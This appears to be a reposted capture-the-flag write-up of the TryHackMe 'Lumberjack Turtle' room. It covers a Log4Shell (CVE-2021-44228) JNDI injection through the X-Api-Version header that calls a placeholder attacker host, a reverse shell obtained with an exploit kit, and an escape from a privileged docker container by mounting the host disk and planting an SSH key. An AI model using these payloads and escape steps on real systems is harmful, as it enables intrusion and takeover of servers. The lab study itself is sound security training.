# :game_die: Lumberjack Turtle - Writeup

> **Original Source:** [Lumberjack Turtle - Writeup](https://infosecwriteups.com/lumberjack-turtle-writeup-29b647e9b694)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Lumberjack Turtle — Writeup


**Difficulty**: Medium Room
**Description**: No logs, no crime… so says the lumberjack.


Hey folks, here is the writeup for the [Lumberjack Turtle](https://tryhackme.com/room/lumberjackturtle) room from TryHackme.

## Enumeration


## Nmap


### Website (Port 80)


Visiting any random non-existent page (`/test`) throws this error with 404 status code.


Visiting `/error` gives the `status=999` in the error message with 500 status code.


Run recursive directory busting and we have `/~logs/log4j` directory.


The response header `X-THM-HINT: CVE-2021-44228 against X-Api-Version` hints us that we have to use the `X-Api-Version` header.


Also, CVE-2021–44228 is the Log4Shell vulnerability that affects Apache’s Java logging library Log4j which allows attackers to run commands on the affected systems remotely. It got a CVSS score of 10.0 which is the highest possible score.


## Exploitation


Try sending a request with `X-Api-Version: ${jndi:ldap://ATTACKER-IP:3333}` to the server. Also, keep a netcat listener running at port 3333. The netcat listener will listen a connection from the victim machine:


With this, we can confirm that the web application is indeed vulnerable.


## Get Manash’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Next, `git clone` the [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) from github. Follow the instructions on the README.md file in the github repo. Now, change directory to the JNDI-Exploit-Kit directory and run the exploit:


The base64 payload is a simple reverse shell that connects back to our attacker machine at port 9999.


Grab the exploit URL from the output shown above and send the request.


Make sure to keep a listener running on port 9999.

## Privilege escalation


We get a shell as root. But it is actually inside a docker container.


The flag1 is located at `/opt/.flag1` Running linpeas, we can see that privileged mode is enabled. It allows us to access the host filesystem from within the docker container. We simply have to mount the disk.


Check for disks in the system with `fdisk -l`


The host uses the disk at `/dev/xvda1`. Create a folder at `/mnt/host` and mount the drive:


```
mount /dev/xvda1 /mnt/host
```


The host filesystem can be accessed from `/mnt/host`. Use `chroot /mnt/host` to change the root filesystem. Create a SSH key pair and get a SSH session with the `id_rsa` file:


Log in and you’ll see a directory `/root/...`. The root flag is in this folder.


Happy hacking !

---

*Originally published on [Medium](https://infosecwriteups.com/lumberjack-turtle-writeup-29b647e9b694). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
